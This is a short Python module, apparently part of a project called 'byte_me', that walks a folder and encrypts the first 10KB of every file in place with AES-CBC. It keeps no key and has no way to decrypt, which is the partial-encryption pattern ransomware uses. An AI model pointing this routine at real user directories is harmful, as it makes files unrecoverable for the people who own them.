import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from byte_me.utils import log_action

def encrypt_files(key: bytes, folder: str = ".byte_me"):
    """
    מצפין את 1–10KB הראשונים של כל קובץ תחת התיקייה folder באמצעות AES-CBC.
    :param key: מפתח AES באורך 32 בתים (256-bit).
    :param folder: תיקיית היעד להצפנה (ברירת מחדל: .byte_me).
    """
    if not os.path.isdir(folder):
        print(f"Folder '{folder}' not found.")
        return

    for root, _, files in os.walk(folder):
        for name in files:
            path = os.path.join(root, name)
            _encrypt_file(path, key)

def _encrypt_file(path: str, key: bytes):
    """
    מצפין את חלקו הראשון (עד 10KB) של הקובץ ב-path עם AES-CBC.
    :param path: נתיב הקובץ להצפנה.
    :param key: מפתח AES.
    """
    CHUNK_SIZE = 10 * 1024  # 10KB

    with open(path, "rb") as f:
        data = f.read()

    header = data[:CHUNK_SIZE]
    tail   = data[CHUNK_SIZE:]

    iv     = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_header = cipher.encrypt(pad(header, AES.block_size))

    with open(path, "wb") as f:
        # כתיבה: IV + חטיפי הנתונים המוצפנים + שאר הקובץ
        f.write(iv + encrypted_header + tail)

    log_action(f"Encrypted file: {path}")
